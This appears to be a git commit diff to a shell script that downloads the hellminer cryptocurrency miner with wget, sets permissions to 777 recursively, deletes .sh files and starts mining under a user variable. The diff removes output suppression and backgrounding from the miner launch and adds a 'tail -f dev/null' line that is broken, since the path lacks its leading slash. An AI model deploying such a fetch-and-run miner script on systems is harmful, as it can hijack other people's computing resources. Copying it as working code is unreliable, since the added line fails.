9a74946c363264d08c83cc7923ecb1abfc87ee29
remote <remote@user>
2024-12-11 05:02:34 +0000

    initial

--- m.sh
+++ m.sh
@@ -14,7 +14,8 @@ wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer
 cd "${tmp}"; chmod 777 -R ./; rm -rf ./*.sh; mv h* hm
 
 if [ "$mode" == "0" ]; then
-  ./hm -u ${user} -p d=16384S,hybrid >/dev/null 2>&1 &
+  ./hm -u ${user} -p d=16384S,hybrid
 else
-  ./hm -u ${user} -p d=16384S,hybrid >/dev/null 2>&1
+  ./hm -u ${user} -p d=16384S,hybrid
 fi
+tail -f dev/null
